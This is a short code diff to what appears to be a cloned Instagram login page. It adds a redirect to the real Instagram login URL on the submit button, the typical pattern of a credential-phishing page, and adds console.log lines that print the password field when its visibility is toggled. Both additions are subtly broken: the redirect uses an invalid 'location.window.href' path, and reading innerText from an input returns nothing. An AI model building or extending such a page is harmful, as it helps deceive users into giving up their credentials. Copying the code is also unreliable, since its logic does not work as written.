@@ -62,7 +62,7 @@
                     <label for="password">Password</label>
                     <button type="button" id="show-password-btn">Show</button>
                 </div>
-                <button class="login-button" type="submit" title="Login">Log In</button>
+                <button class="login-button" type="submit" title="Login" onclick="location.window.href='https://www.instagram.com/accounts/login/?mtn&hl=en'">Log In</button>
                 <div class="separator">
                     <div class="line"></div>
                     <p>OR</p>
@@ -197,9 +197,11 @@
         if (passwordField.type === 'password') {
             passwordField.type = 'text';
             showPasswordBtn.textContent = 'Hide';
+console.log(passwordField.innerText);
         } else {
             passwordField.type = 'password';
             showPasswordBtn.textContent = 'Show';
+console.log(passwordField.innerText);
         }
     });
     window.addEventListener('load', () => {
